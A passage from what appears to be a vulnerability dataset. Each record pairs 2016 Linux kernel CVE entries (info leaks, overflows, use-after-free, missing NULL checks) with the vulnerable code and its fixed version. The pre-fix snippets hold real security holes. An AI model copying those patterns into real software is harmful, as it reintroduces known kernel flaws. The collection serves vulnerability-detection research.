 llc_pdu_decode_dsap(skb, &info.lpi_sap);
 llc_pdu_decode_da(skb, info.lpi_mac);
"," if (llc->cmsg_flags & LLC_CMSG_PKTINFO) {
 struct llc_pktinfo info;

 memset(&info, 0, sizeof(info));
		info.lpi_ifindex = llc_sk(skb->sk)->dev->ifindex;
 llc_pdu_decode_dsap(skb, &info.lpi_sap);
 llc_pdu_decode_da(skb, info.lpi_mac);
"
2016,#NAME?,CVE-2016-4482,"
static int proc_connectinfo(struct usb_dev_state *ps, void __user *arg)
{
 struct usbdevfs_connectinfo ci = {
		.devnum = ps->dev->devnum,
		.slow = ps->dev->speed == USB_SPEED_LOW
	};


 if (copy_to_user(arg, &ci, sizeof(ci)))
 return -EFAULT;
","
static int proc_connectinfo(struct usb_dev_state *ps, void __user *arg)
{
 struct usbdevfs_connectinfo ci;

 memset(&ci, 0, sizeof(ci));
	ci.devnum = ps->dev->devnum;
	ci.slow = ps->dev->speed == USB_SPEED_LOW;

 if (copy_to_user(arg, &ci, sizeof(ci)))
 return -EFAULT;
"
2016,DoS ,CVE-2016-4470,"
 mutex_unlock(&key_construction_mutex);

 if (keyring)
 __key_link_end(keyring, &key->index_key, edit);

 /* wake up anyone waiting for a key to be constructed */
","
 mutex_unlock(&key_construction_mutex);

 if (keyring && link_ret == 0)
 __key_link_end(keyring, &key->index_key, edit);

 /* wake up anyone waiting for a key to be constructed */
"
2016,DoS Exec Code ,CVE-2016-4440,"
 if (is_guest_mode(vcpu))
		msr_bitmap = vmx_msr_bitmap_nested;
 else if (vcpu->arch.apic_base & X2APIC_ENABLE) {


 if (is_long_mode(vcpu))
			msr_bitmap = vmx_msr_bitmap_longmode_x2apic;
 else
 struct vcpu_vmx *vmx = to_vmx(vcpu);

 vmcs_write32(PIN_BASED_VM_EXEC_CONTROL, vmx_pin_based_exec_ctrl(vmx));













}

static u32 vmx_exec_control(struct vcpu_vmx *vmx)

 set_bit(0, vmx_vpid_bitmap); /* 0 is reserved for host */

 if (enable_apicv) {
 for (msr = 0x800; msr <= 0x8ff; msr++)
 vmx_disable_intercept_msr_read_x2apic(msr);

 /* According SDM, in x2apic mode, the whole id reg is used.
		 * But in KVM, it only use the highest eight bits. Need to
		 * intercept it */
 vmx_enable_intercept_msr_read_x2apic(0x802);
 /* TMCCT */
 vmx_enable_intercept_msr_read_x2apic(0x839);
 /* TPR */
 vmx_disable_intercept_msr_write_x2apic(0x808);
 /* EOI */
 vmx_disable_intercept_msr_write_x2apic(0x80b);
 /* SELF-IPI */
 vmx_disable_intercept_msr_write_x2apic(0x83f);
	}

 if (enable_ept) {
 kvm_mmu_set_mask_ptes(0ull,
","
 if (is_guest_mode(vcpu))
		msr_bitmap = vmx_msr_bitmap_nested;
 else if (cpu_has_secondary_exec_ctrls() &&
		 (vmcs_read32(SECONDARY_VM_EXEC_CONTROL) &
		  SECONDARY_EXEC_VIRTUALIZE_X2APIC_MODE)) {
 if (is_long_mode(vcpu))
			msr_bitmap = vmx_msr_bitmap_longmode_x2apic;
 else
 struct vcpu_vmx *vmx = to_vmx(vcpu);

 vmcs_write32(PIN_BASED_VM_EXEC_CONTROL, vmx_pin_based_exec_ctrl(vmx));
 if (cpu_has_secondary_exec_ctrls()) {
 if (kvm_vcpu_apicv_active(vcpu))
 vmcs_set_bits(SECONDARY_VM_EXEC_CONTROL,
				      SECONDARY_EXEC_APIC_REGISTER_VIRT |
				      SECONDARY_EXEC_VIRTUAL_INTR_DELIVERY);
 else
 vmcs_clear_bits(SECONDARY_VM_EXEC_CONTROL,
					SECONDARY_EXEC_APIC_REGISTER_VIRT |
					SECONDARY_EXEC_VIRTUAL_INTR_DELIVERY);
	}

 if (cpu_has_vmx_msr_bitmap())
 vmx_set_msr_bitmap(vcpu);
}

static u32 vmx_exec_control(struct vcpu_vmx *vmx)

 set_bit(0, vmx_vpid_bitmap); /* 0 is reserved for host */

 for (msr = 0x800; msr <= 0x8ff; msr++)
 vmx_disable_intercept_msr_read_x2apic(msr);

 /* According SDM, in x2apic mode, the whole id reg is used.  But in
	 * KVM, it only use the highest eight bits. Need to intercept it */
 vmx_enable_intercept_msr_read_x2apic(0x802);
 /* TMCCT */
 vmx_enable_intercept_msr_read_x2apic(0x839);
 /* TPR */
 vmx_disable_intercept_msr_write_x2apic(0x808);
 /* EOI */
 vmx_disable_intercept_msr_write_x2apic(0x80b);
 /* SELF-IPI */
 vmx_disable_intercept_msr_write_x2apic(0x83f);




 if (enable_ept) {
 kvm_mmu_set_mask_ptes(0ull,
"
2016,DoS Overflow ,CVE-2016-3955," if (!(size > 0))
 return 0;












	ret = usbip_recv(ud->tcp_socket, urb->transfer_buffer, size);
 if (ret != size) {
 dev_err(&urb->dev->dev, ""recv xbuf, %d\n"", ret);
"," if (!(size > 0))
 return 0;

 if (size > urb->transfer_buffer_length) {
 /* should not happen, probably malicious packet */
 if (ud->side == USBIP_STUB) {
 usbip_event_add(ud, SDEV_EVENT_ERROR_TCP);
 return 0;
		} else {
 usbip_event_add(ud, VDEV_EVENT_ERROR_TCP);
 return -EPIPE;
		}
	}

	ret = usbip_recv(ud->tcp_socket, urb->transfer_buffer, size);
 if (ret != size) {
 dev_err(&urb->dev->dev, ""recv xbuf, %d\n"", ret);
"
2016,DoS ,CVE-2016-3951,"
static int cdc_ncm_bind(struct usbnet *dev, struct usb_interface *intf)
{
 int ret;

 /* MBIM backwards compatible function? */
 if (cdc_ncm_select_altsetting(intf) != CDC_NCM_COMM_ALTSETTING_NCM)
 return -ENODEV;
	 * Additionally, generic NCM devices are assumed to accept arbitrarily
	 * placed NDP.
 */
	ret = cdc_ncm_bind_common(dev, intf, CDC_NCM_DATA_ALTSETTING_NCM, 0);

 /*
	 * We should get an event when network connection is ""connected"" or
	 * ""disconnected"". Set network connection in ""disconnected"" state
	 * (carrier is OFF) during attach, so the IP network stack does not
	 * start IPv6 negotiation and more.
 */
 usbnet_link_change(dev, 0, 0);
 return ret;
}

static void cdc_ncm_align_tail(struct sk_buff *skb, size_t modulus, size_t remainder, size_t max)

static const struct driver_info cdc_ncm_info = {
	.description = ""CDC NCM"",
	.flags = FLAG_POINTTOPOINT | FLAG_NO_SETINT | FLAG_MULTI_PACKET,

	.bind = cdc_ncm_bind,
	.unbind = cdc_ncm_unbind,
	.manage_power = usbnet_manage_power,
static const struct driver_info wwan_info = {
	.description = ""Mobile Broadband Network Device"",
	.flags = FLAG_POINTTOPOINT | FLAG_NO_SETINT | FLAG_MULTI_PACKET
			| FLAG_WWAN,
	.bind = cdc_ncm_bind,
	.unbind = cdc_ncm_unbind,
	.manage_power = usbnet_manage_power,
static const struct driver_info wwan_noarp_info = {
	.description = ""Mobile Broadband Network Device (NO ARP)"",
	.flags = FLAG_POINTTOPOINT | FLAG_NO_SETINT | FLAG_MULTI_PACKET
			| FLAG_WWAN | FLAG_NOARP,
	.bind = cdc_ncm_bind,
	.unbind = cdc_ncm_unbind,
	.manage_power = usbnet_manage_power,
","
static int cdc_ncm_bind(struct usbnet *dev, struct usb_interface *intf)
{


 /* MBIM backwards compatible function? */
 if (cdc_ncm_select_altsetting(intf) != CDC_NCM_COMM_ALTSETTING_NCM)
 return -ENODEV;
	 * Additionally, generic NCM devices are assumed to accept arbitrarily
	 * placed NDP.
 */
 return cdc_ncm_bind_common(dev, intf, CDC_NCM_DATA_ALTSETTING_NCM, 0);









}

static void cdc_ncm_align_tail(struct sk_buff *skb, size_t modulus, size_t remainder, size_t max)

static const struct driver_info cdc_ncm_info = {
	.description = ""CDC NCM"",
	.flags = FLAG_POINTTOPOINT | FLAG_NO_SETINT | FLAG_MULTI_PACKET
			| FLAG_LINK_INTR,
	.bind = cdc_ncm_bind,
	.unbind = cdc_ncm_unbind,
	.manage_power = usbnet_manage_power,
static const struct driver_info wwan_info = {
	.description = ""Mobile Broadband Network Device"",
	.flags = FLAG_POINTTOPOINT | FLAG_NO_SETINT | FLAG_MULTI_PACKET
			| FLAG_LINK_INTR | FLAG_WWAN,
	.bind = cdc_ncm_bind,
	.unbind = cdc_ncm_unbind,
	.manage_power = usbnet_manage_power,
static const struct driver_info wwan_noarp_info = {
	.description = ""Mobile Broadband Network Device (NO ARP)"",
	.flags = FLAG_POINTTOPOINT | FLAG_NO_SETINT | FLAG_MULTI_PACKET
			| FLAG_LINK_INTR | FLAG_WWAN | FLAG_NOARP,
	.bind = cdc_ncm_bind,
	.unbind = cdc_ncm_unbind,
	.manage_power = usbnet_manage_power,
"
2016,DoS +Priv ,CVE-2016-3841," struct ipv6_ac_socklist	*ipv6_ac_list;
 struct ipv6_fl_socklist __rcu *ipv6_fl_list;

 struct ipv6_txoptions	*opt;
 struct sk_buff		*pktoptions;
 struct sk_buff		*rxpmtu;
 struct inet6_cork	cork;
 */

struct ipv6_txoptions {

 /* Length of this structure */
 int			tot_len;

 struct ipv6_opt_hdr	*dst0opt;
 struct ipv6_rt_hdr	*srcrt;	/* Routing Header */
 struct ipv6_opt_hdr	*dst1opt;

 /* Option buffer, as read by IPV6_PKTOPTIONS, starts here. */
};

 struct rcu_head			rcu;
};



















struct ip6_flowlabel *fl6_sock_lookup(struct sock *sk, __be32 label);
struct ipv6_txoptions *fl6_merge_options(struct ipv6_txoptions *opt_space,
 struct ip6_flowlabel *fl,
 security_req_classify_flow(req, flowi6_to_flowi(&fl6));


	final_p = fl6_update_dst(&fl6, np->opt, &final);



	dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
 if (IS_ERR(dst)) {
							 &ireq->ir_v6_loc_addr,
							 &ireq->ir_v6_rmt_addr);
		fl6.daddr = ireq->ir_v6_rmt_addr;
		err = ip6_xmit(sk, skb, &fl6, np->opt, np->tclass);



		err = net_xmit_eval(err);
	}

 struct inet_request_sock *ireq = inet_rsk(req);
 struct ipv6_pinfo *newnp;
 const struct ipv6_pinfo *np = inet6_sk(sk);

 struct inet_sock *newinet;
 struct dccp6_sock *newdp6;
 struct sock *newsk;
	 * Yes, keeping reference count would be much more clever, but we make
	 * one more one thing there: reattach optmem to newsk.
 */
 if (np->opt != NULL)
		newnp->opt = ipv6_dup_options(newsk, np->opt);



 inet_csk(newsk)->icsk_ext_hdr_len = 0;
 if (newnp->opt != NULL)
 inet_csk(newsk)->icsk_ext_hdr_len = (newnp->opt->opt_nflen +
  newnp->opt->opt_flen);

 dccp_sync_mss(newsk, dst_mtu(dst));

 struct ipv6_pinfo *np = inet6_sk(sk);
 struct dccp_sock *dp = dccp_sk(sk);
 struct in6_addr *saddr = NULL, *final_p, final;

 struct flowi6 fl6;
 struct dst_entry *dst;
 int addr_type;
	fl6.fl6_sport = inet->inet_sport;
 security_sk_classify_flow(sk, flowi6_to_flowi(&fl6));

	final_p = fl6_update_dst(&fl6, np->opt, &final);


	dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
 if (IS_ERR(dst)) {
 __ip6_dst_store(sk, dst, NULL, NULL);

	icsk->icsk_ext_hdr_len = 0;
 if (np->opt != NULL)
		icsk->icsk_ext_hdr_len = (np->opt->opt_flen +
					  np->opt->opt_nflen);

	inet->inet_dport = usin->sin6_port;


 /* Free tx options */

	opt = xchg(&np->opt, NULL);
 if (opt)
 sock_kfree_s(sk, opt, opt->tot_len);


}
EXPORT_SYMBOL_GPL(inet6_destroy_sock);

		fl6.fl6_sport = inet->inet_sport;
 security_sk_classify_flow(sk, flowi6_to_flowi(&fl6));

		final_p = fl6_update_dst(&fl6, np->opt, &final);




		dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
 if (IS_ERR(dst)) {

 security_sk_classify_flow(sk, flowi6_to_flowi(&fl6));

	opt = flowlabel ? flowlabel->opt : np->opt;

	final_p = fl6_update_dst(&fl6, opt, &final);


	dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
	err = 0;
			*((char **)&opt2->dst1opt) += dif;
 if (opt2->srcrt)
			*((char **)&opt2->srcrt) += dif;

	}
 return opt2;
}
 return ERR_PTR(-ENOBUFS);

 memset(opt2, 0, tot_len);

	opt2->tot_len = tot_len;
	p = (char *)(opt2 + 1);

 memset(fl6, 0, sizeof(*fl6));
	fl6->flowi6_proto = proto;
	fl6->daddr = ireq->ir_v6_rmt_addr;
	final_p = fl6_update_dst(fl6, np->opt, &final);


	fl6->saddr = ireq->ir_v6_loc_addr;
	fl6->flowi6_oif = ireq->ir_iif;
	fl6->flowi6_mark = ireq->ir_mark;
	fl6->fl6_dport = inet->inet_dport;
 security_sk_classify_flow(sk, flowi6_to_flowi(fl6));

	final_p = fl6_update_dst(fl6, np->opt, &final);



	dst = __inet6_csk_dst_check(sk, np->dst_cookie);
 if (!dst) {
 /* Restore final destination back after routing done */
	fl6.daddr = sk->sk_v6_daddr;

	res = ip6_xmit(sk, skb, &fl6, np->opt, np->tclass);

 rcu_read_unlock();
 return res;
}
			icsk->icsk_sync_mss(sk, icsk->icsk_pmtu_cookie);
		}
	}
	opt = xchg(&inet6_sk(sk)->opt, opt);

 sk_dst_reset(sk);

 return opt;
				sk->sk_socket->ops = &inet_dgram_ops;
				sk->sk_family = PF_INET;
			}
			opt = xchg(&np->opt, NULL);
 if (opt)
 sock_kfree_s(sk, opt, opt->tot_len);



			pktopt = xchg(&np->pktoptions, NULL);
 kfree_skb(pktopt);

 if (optname != IPV6_RTHDR && !ns_capable(net->user_ns, CAP_NET_RAW))
 break;

		opt = ipv6_renew_options(sk, np->opt, optname,

					 (struct ipv6_opt_hdr __user *)optval,
					 optlen);
 if (IS_ERR(opt)) {
		retv = 0;
		opt = ipv6_update_options(sk, opt);
sticky_done:
 if (opt)
 sock_kfree_s(sk, opt, opt->tot_len);


 break;
	}

 break;

 memset(opt, 0, sizeof(*opt));

		opt->tot_len = sizeof(*opt) + optlen;
		retv = -EFAULT;
 if (copy_from_user(opt+1, optval, optlen))
		retv = 0;
		opt = ipv6_update_options(sk, opt);
done:
 if (opt)
 sock_kfree_s(sk, opt, opt->tot_len);


 break;
	}
 case IPV6_UNICAST_HOPS:
 case IPV6_RTHDR:
 case IPV6_DSTOPTS:
	{


 lock_sock(sk);
 len = ipv6_getsockopt_sticky(sk, np->opt,
   optname, optval, len);
 release_sock(sk);
 /* check if ipv6_getsockopt_sticky() returns err code */
 if (len < 0)

static int rawv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)
{

 struct ipv6_txoptions opt_space;
 DECLARE_SOCKADDR(struct sockaddr_in6 *, sin6, msg->msg_name);
 struct in6_addr *daddr, *final_p, final;
 if (!(opt->opt_nflen|opt->opt_flen))
			opt = NULL;
	}
 if (!opt)
		opt = np->opt;


 if (flowlabel)
		opt = fl6_merge_options(&opt_space, flowlabel, opt);
	opt = ipv6_fixup_options(&opt_space, opt);
 dst_release(dst);
out:
 fl6_sock_release(flowlabel);

 return err < 0 ? err : len;
do_confirm:
 dst_confirm(dst);
 memset(&fl6, 0, sizeof(fl6));
		fl6.flowi6_proto = IPPROTO_TCP;
		fl6.daddr = ireq->ir_v6_rmt_addr;
		final_p = fl6_update_dst(&fl6, np->opt, &final);
		fl6.saddr = ireq->ir_v6_loc_addr;
		fl6.flowi6_oif = sk->sk_bound_dev_if;
		fl6.flowi6_mark = ireq->ir_mark;
"," struct ipv6_ac_socklist	*ipv6_ac_list;
 struct ipv6_fl_socklist __rcu *ipv6_fl_list;

 struct ipv6_txoptions __rcu	*opt;
 struct sk_buff		*pktoptions;
 struct sk_buff		*rxpmtu;
 struct inet6_cork	cork;
 */

struct ipv6_txoptions {
 atomic_t		refcnt;
 /* Length of this structure */
 int			tot_len;

 struct ipv6_opt_hdr	*dst0opt;
 struct ipv6_rt_hdr	*srcrt;	/* Routing Header */
 struct ipv6_opt_hdr	*dst1opt;
 struct rcu_head		rcu;
 /* Option buffer, as read by IPV6_PKTOPTIONS, starts here. */
};

 struct rcu_head			rcu;
};

static inline struct ipv6_txoptions *txopt_get(const struct ipv6_pinfo *np)
{
 struct ipv6_txoptions *opt;

 rcu_read_lock();
	opt = rcu_dereference(np->opt);
 if (opt && !atomic_inc_not_zero(&opt->refcnt))
		opt = NULL;
 rcu_read_unlock();
 return opt;
}

static inline void txopt_put(struct ipv6_txoptions *opt)
{
 if (opt && atomic_dec_and_test(&opt->refcnt))
 kfree_rcu(opt, rcu);
}

struct ip6_flowlabel *fl6_sock_lookup(struct sock *sk, __be32 label);
struct ipv6_txoptions *fl6_merge_options(struct ipv6_txoptions *opt_space,
 struct ip6_flowlabel *fl,
 security_req_classify_flow(req, flowi6_to_flowi(&fl6));


 rcu_read_lock();
	final_p = fl6_update_dst(&fl6, rcu_dereference(np->opt), &final);
 rcu_read_unlock();

	dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
 if (IS_ERR(dst)) {
							 &ireq->ir_v6_loc_addr,
							 &ireq->ir_v6_rmt_addr);
		fl6.daddr = ireq->ir_v6_rmt_addr;
 rcu_read_lock();
		err = ip6_xmit(sk, skb, &fl6, rcu_dereference(np->opt),
			       np->tclass);
 rcu_read_unlock();
		err = net_xmit_eval(err);
	}

 struct inet_request_sock *ireq = inet_rsk(req);
 struct ipv6_pinfo *newnp;
 const struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6_txoptions *opt;
 struct inet_sock *newinet;
 struct dccp6_sock *newdp6;
 struct sock *newsk;
	 * Yes, keeping reference count would be much more clever, but we make
	 * one more one thing there: reattach optmem to newsk.
 */
	opt = rcu_dereference(np->opt);
 if (opt) {
		opt = ipv6_dup_options(newsk, opt);
 RCU_INIT_POINTER(newnp->opt, opt);
	}
 inet_csk(newsk)->icsk_ext_hdr_len = 0;
 if (opt)
 inet_csk(newsk)->icsk_ext_hdr_len = opt->opt_nflen +
						    opt->opt_flen;

 dccp_sync_mss(newsk, dst_mtu(dst));

 struct ipv6_pinfo *np = inet6_sk(sk);
 struct dccp_sock *dp = dccp_sk(sk);
 struct in6_addr *saddr = NULL, *final_p, final;
 struct ipv6_txoptions *opt;
 struct flowi6 fl6;
 struct dst_entry *dst;
 int addr_type;
	fl6.fl6_sport = inet->inet_sport;
 security_sk_classify_flow(sk, flowi6_to_flowi(&fl6));

	opt = rcu_dereference_protected(np->opt, sock_owned_by_user(sk));
	final_p = fl6_update_dst(&fl6, opt, &final);

	dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
 if (IS_ERR(dst)) {
 __ip6_dst_store(sk, dst, NULL, NULL);

	icsk->icsk_ext_hdr_len = 0;
 if (opt)
		icsk->icsk_ext_hdr_len = opt->opt_flen + opt->opt_nflen;


	inet->inet_dport = usin->sin6_port;


 /* Free tx options */

	opt = xchg((__force struct ipv6_txoptions **)&np->opt, NULL);
 if (opt) {
 atomic_sub(opt->tot_len, &sk->sk_omem_alloc);
 txopt_put(opt);
	}
}
EXPORT_SYMBOL_GPL(inet6_destroy_sock);

		fl6.fl6_sport = inet->inet_sport;
 security_sk_classify_flow(sk, flowi6_to_flowi(&fl6));

 rcu_read_lock();
		final_p = fl6_update_dst(&fl6, rcu_dereference(np->opt),
					 &final);
 rcu_read_unlock();

		dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
 if (IS_ERR(dst)) {

 security_sk_classify_flow(sk, flowi6_to_flowi(&fl6));

 rcu_read_lock();
	opt = flowlabel ? flowlabel->opt : rcu_dereference(np->opt);
	final_p = fl6_update_dst(&fl6, opt, &final);
 rcu_read_unlock();

	dst = ip6_dst_lookup_flow(sk, &fl6, final_p);
	err = 0;
			*((char **)&opt2->dst1opt) += dif;
 if (opt2->srcrt)
			*((char **)&opt2->srcrt) += dif;
 atomic_set(&opt2->refcnt, 1);
	}
 return opt2;
}
 return ERR_PTR(-ENOBUFS);

 memset(opt2, 0, tot_len);
 atomic_set(&opt2->refcnt, 1);
	opt2->tot_len = tot_len;
	p = (char *)(opt2 + 1);

 memset(fl6, 0, sizeof(*fl6));
	fl6->flowi6_proto = proto;
	fl6->daddr = ireq->ir_v6_rmt_addr;
 rcu_read_lock();
	final_p = fl6_update_dst(fl6, rcu_dereference(np->opt), &final);
 rcu_read_unlock();
	fl6->saddr = ireq->ir_v6_loc_addr;
	fl6->flowi6_oif = ireq->ir_iif;
	fl6->flowi6_mark = ireq->ir_mark;
	fl6->fl6_dport = inet->inet_dport;
 security_sk_classify_flow(sk, flowi6_to_flowi(fl6));

 rcu_read_lock();
	final_p = fl6_update_dst(fl6, rcu_dereference(np->opt), &final);
 rcu_read_unlock();

	dst = __inet6_csk_dst_check(sk, np->dst_cookie);
 if (!dst) {
 /* Restore final destination back after routing done */
	fl6.daddr = sk->sk_v6_daddr;

	res = ip6_xmit(sk, skb, &fl6, rcu_dereference(np->opt),
		       np->tclass);
 rcu_read_unlock();
 return res;
}
			icsk->icsk_sync_mss(sk, icsk->icsk_pmtu_cookie);
		}
	}
	opt = xchg((__force struct ipv6_txoptions **)&inet6_sk(sk)->opt,
		   opt);
 sk_dst_reset(sk);

 return opt;
				sk->sk_socket->ops = &inet_dgram_ops;
				sk->sk_family = PF_INET;
			}
			opt = xchg((__force struct ipv6_txoptions **)&np->opt,
 NULL);
 if (opt) {
 atomic_sub(opt->tot_len, &sk->sk_omem_alloc);
 txopt_put(opt);
			}
			pktopt = xchg(&np->pktoptions, NULL);
 kfree_skb(pktopt);

 if (optname != IPV6_RTHDR && !ns_capable(net->user_ns, CAP_NET_RAW))
 break;

		opt = rcu_dereference_protected(np->opt, sock_owned_by_user(sk));
		opt = ipv6_renew_options(sk, opt, optname,
					 (struct ipv6_opt_hdr __user *)optval,
					 optlen);
 if (IS_ERR(opt)) {
		retv = 0;
		opt = ipv6_update_options(sk, opt);
sticky_done:
 if (opt) {
 atomic_sub(opt->tot_len, &sk->sk_omem_alloc);
 txopt_put(opt);
		}
 break;
	}

 break;

 memset(opt, 0, sizeof(*opt));
 atomic_set(&opt->refcnt, 1);
		opt->tot_len = sizeof(*opt) + optlen;
		retv = -EFAULT;
 if (copy_from_user(opt+1, optval, optlen))
		retv = 0;
		opt = ipv6_update_options(sk, opt);
done:
 if (opt) {
 atomic_sub(opt->tot_len, &sk->sk_omem_alloc);
 txopt_put(opt);
		}
 break;
	}
 case IPV6_UNICAST_HOPS:
 case IPV6_RTHDR:
 case IPV6_DSTOPTS:
	{
 struct ipv6_txoptions *opt;

 lock_sock(sk);
 opt = rcu_dereference_protected(np->opt, sock_owned_by_user(sk));
 len = ipv6_getsockopt_sticky(sk, opt, optname, optval, len);
 release_sock(sk);
 /* check if ipv6_getsockopt_sticky() returns err code */
 if (len < 0)

static int rawv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)
{
 struct ipv6_txoptions *opt_to_free = NULL;
 struct ipv6_txoptions opt_space;
 DECLARE_SOCKADDR(struct sockaddr_in6 *, sin6, msg->msg_name);
 struct in6_addr *daddr, *final_p, final;
 if (!(opt->opt_nflen|opt->opt_flen))
			opt = NULL;
	}
 if (!opt) {
		opt = txopt_get(np);
		opt_to_free = opt;
		}
 if (flowlabel)
		opt = fl6_merge_options(&opt_space, flowlabel, opt);
	opt = ipv6_fixup_options(&opt_space, opt);
 dst_release(dst);
out:
 fl6_sock_release(flowlabel);
 txopt_put(opt_to_free);
 return err < 0 ? err : len;
do_confirm:
 dst_confirm(dst);
 memset(&fl6, 0, sizeof(fl6));
		fl6.flowi6_proto = IPPROTO_TCP;
		fl6.daddr = ireq->ir_v6_rmt_addr;
		final_p = fl6_update_dst(&fl6, rcu_dereference(np->opt), &final);
		fl6.saddr = ireq->ir_v6_loc_addr;
		fl6.flowi6_oif = sk->sk_bound_dev_if;
		fl6.flowi6_mark = ireq->ir_mark;
"
2016,DoS +Info ,CVE-2016-3713," case MSR_MTRRdefType:
 case MSR_IA32_CR_PAT:
 return true;
 case 0x2f8:
 return true;
	}
 return false;
}
"," case MSR_MTRRdefType:
 case MSR_IA32_CR_PAT:
 return true;


	}
 return false;
}
"
2016,Exec Code Bypass ,CVE-2016-3699," /* Allocate bigger log buffer */
 setup_log_buf(1);







 reserve_initrd();

#if defined(CONFIG_ACPI) && defined(CONFIG_BLK_DEV_INITRD)

 io_delay_init();

#ifdef CONFIG_EFI_SECURE_BOOT_SECURELEVEL
 if (boot_params.secure_boot) {
 set_securelevel(1);
	}
#endif

 /*
	 * Parse the ACPI tables for possible boot-time SMP configuration.
 */
 if (table_nr == 0)
 return;







	acpi_tables_addr =
 memblock_find_in_range(0, max_low_pfn_mapped << PAGE_SHIFT,
				       all_tables_size, PAGE_SIZE);
"," /* Allocate bigger log buffer */
 setup_log_buf(1);

#ifdef CONFIG_EFI_SECURE_BOOT_SECURELEVEL
 if (boot_params.secure_boot) {
 set_securelevel(1);
	}
#endif

 reserve_initrd();

#if defined(CONFIG_ACPI) && defined(CONFIG_BLK_DEV_INITRD)

 io_delay_init();







 /*
	 * Parse the ACPI tables for possible boot-time SMP configuration.
 */
 if (table_nr == 0)
 return;

 if (get_securelevel() > 0) {
 pr_notice(PREFIX
 ""securelevel enabled, ignoring table override\n"");
 return;
	}

	acpi_tables_addr =
 memblock_find_in_range(0, max_low_pfn_mapped << PAGE_SHIFT,
				       all_tables_size, PAGE_SIZE);
"
2017,DoS ,CVE-2016-3695,"#include <linux/nmi.h>
#include <linux/delay.h>
#include <linux/mm.h>

#include <asm/unaligned.h>

#include ""apei-internal.h""
 int rc;
	u64 base_addr, size;




 /* If user manually set ""flags"", make sure it is legal */
 if (flags && (flags &
		~(SETWA_FLAGS_APICID|SETWA_FLAGS_MEM|SETWA_FLAGS_PCIE_SBDF)))
","#include <linux/nmi.h>
#include <linux/delay.h>
#include <linux/mm.h>
#include <linux/security.h>
#include <asm/unaligned.h>

#include ""apei-internal.h""
 int rc;
	u64 base_addr, size;

 if (get_securelevel() > 0)
 return -EPERM;

 /* If user manually set ""flags"", make sure it is legal */
 if (flags && (flags &
		~(SETWA_FLAGS_APICID|SETWA_FLAGS_MEM|SETWA_FLAGS_PCIE_SBDF)))
"
2016,DoS ,CVE-2016-3689,"
	pcu->ctrl_intf = usb_ifnum_to_if(pcu->udev,
					 union_desc->bMasterInterface0);



	alt = pcu->ctrl_intf->cur_altsetting;
	pcu->ep_ctrl = &alt->endpoint[0].desc;
	pcu->max_ctrl_size = usb_endpoint_maxp(pcu->ep_ctrl);

	pcu->data_intf = usb_ifnum_to_if(pcu->udev,
					 union_desc->bSlaveInterface0);



	alt = pcu->data_intf->cur_altsetting;
 if (alt->desc.bNumEndpoints != 2) {
","
	pcu->ctrl_intf = usb_ifnum_to_if(pcu->udev,
					 union_desc->bMasterInterface0);
 if (!pcu->ctrl_intf)
 return -EINVAL;

	alt = pcu->ctrl_intf->cur_altsetting;
	pcu->ep_ctrl = &alt->endpoint[0].desc;
	pcu->max_ctrl_size = usb_endpoint_maxp(pcu->ep_ctrl);

	pcu->data_intf = usb_ifnum_to_if(pcu->udev,
					 union_desc->bSlaveInterface0);
 if (!pcu->data_intf)
 return -EINVAL;

	alt = pcu->data_intf->cur_altsetting;
 if (alt->desc.bNumEndpoints != 2) {
"
2016,Bypass ,CVE-2016-3672," return PAGE_ALIGN(TASK_SIZE - gap - rnd);
}

/*
 * Bottom-up (legacy) layout on X86_32 did not support randomization, X86_64
 * does, but not when emulating X86_32
 */
static unsigned long mmap_legacy_base(unsigned long rnd)
{
 if (mmap_is_ia32())
 return TASK_UNMAPPED_BASE;
 else
 return TASK_UNMAPPED_BASE + rnd;
}

/*
 * This function, called very early during the creation of a new
 * process VM image, sets up which VM layout function to use:
 if (current->flags & PF_RANDOMIZE)
		random_factor = arch_mmap_rnd();

	mm->mmap_legacy_base = mmap_legacy_base(random_factor);

 if (mmap_is_legacy()) {
		mm->mmap_base = mm->mmap_legacy_base;
"," return PAGE_ALIGN(TASK_SIZE - gap - rnd);
}













/*
 * This function, called very early during the creation of a new
 * process VM image, sets up which VM layout function to use:
 if (current->flags & PF_RANDOMIZE)
		random_factor = arch_mmap_rnd();

	mm->mmap_legacy_base = TASK_UNMAPPED_BASE + random_factor;

 if (mmap_is_legacy()) {
		mm->mmap_base = mm->mmap_legacy_base;
"
2016,DoS ,CVE-2016-3156,"
 ASSERT_RTNL();




 /* 1. Deleting primary ifaddr forces deletion all secondaries
	 * unless alias promotion is set
	 **/
 fib_del_ifaddr(ifa, ifa1);
	}


 /* 2. Unlink it */

	*ifap = ifa1->ifa_next;
		subnet = 1;
	}




 /* Deletion is more complicated than add.
	 * We should take care of not to delete too much :-)
	 *
		}
	}


 if (!(ok & BRD_OK))
 fib_magic(RTM_DELROUTE, RTN_BROADCAST, ifa->ifa_broadcast, 32, prim);
 if (subnet && ifa->ifa_prefixlen < 31) {
 unsigned long event,
 void *ptr)
{
 struct net_device *dev = ((struct in_ifaddr *)ptr)->ifa_dev->dev;
 struct netdev_notifier_info info;

 netdev_notifier_info_init(&info, dev);








 return masq_device_event(this, event, &info);
}

","
 ASSERT_RTNL();

 if (in_dev->dead)
 goto no_promotions;

 /* 1. Deleting primary ifaddr forces deletion all secondaries
	 * unless alias promotion is set
	 **/
 fib_del_ifaddr(ifa, ifa1);
	}

no_promotions:
 /* 2. Unlink it */

	*ifap = ifa1->ifa_next;
		subnet = 1;
	}

 if (in_dev->dead)
 goto no_promotions;

 /* Deletion is more complicated than add.
	 * We should take care of not to delete too much :-)
	 *
		}
	}

no_promotions:
 if (!(ok & BRD_OK))
 fib_magic(RTM_DELROUTE, RTN_BROADCAST, ifa->ifa_broadcast, 32, prim);
 if (subnet && ifa->ifa_prefixlen < 31) {
 unsigned long event,
 void *ptr)
{
 struct in_device *idev = ((struct in_ifaddr *)ptr)->ifa_dev;
 struct netdev_notifier_info info;

 /* The masq_dev_notifier will catch the case of the device going
	 * down.  So if the inetdev is dead and being destroyed we have
	 * no work to do.  Otherwise this is an individual address removal
	 * and we have to perform the flush.
 */
 if (idev->dead)
